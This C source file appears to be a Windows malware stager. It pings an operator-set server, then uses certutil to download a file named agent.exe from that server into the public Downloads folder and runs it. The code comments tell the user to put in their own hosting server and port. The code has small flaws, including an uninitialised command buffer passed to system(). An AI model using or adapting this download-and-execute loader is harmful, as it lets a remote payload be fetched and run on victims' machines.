 #include <stdio.h>
 #include <stdlib.h>


void start(){
    printf("[!] Running..\n");

    char *server = "127.0.0.1"; //Change this with your file hosting server
    int port = 4000; //Change this with your port

    char cmd_1[256];
    
    //if ICMP rules are deactived, modify this command with netcat
    sprintf(cmd_1,"ping -n 1 %s > nul 2>&1",server); 

    int checkServer = system(cmd_1);

    char cmd_2[256];
    
    char *winPath = "C:\\Users\\Public\\Downloads\\";
    


    if (checkServer == 0){
        char cmd[256];
        printf("[OK] Target server is alive.. starting\n");
        int md = system(cmd_2);
            sprintf(cmd,"certutil -urlcache -f -split http://%s:%d/agent.exe %sagent.exe",server,port, winPath);
            int getFile = system(cmd);
            if (getFile == 0){
                printf("[OK] successfully got the file!\n");
                char exec[256];

                sprintf(exec,
                    "\"%s\\agent.exe\"",
                    winPath);

                int exec_file = system(exec);
            }else{
                printf("[!] Error getting the file\n");
            }
    }
    else{
        printf("[OK] Server is unreacheable\n");
    };
}

 int main(){
    start();
 };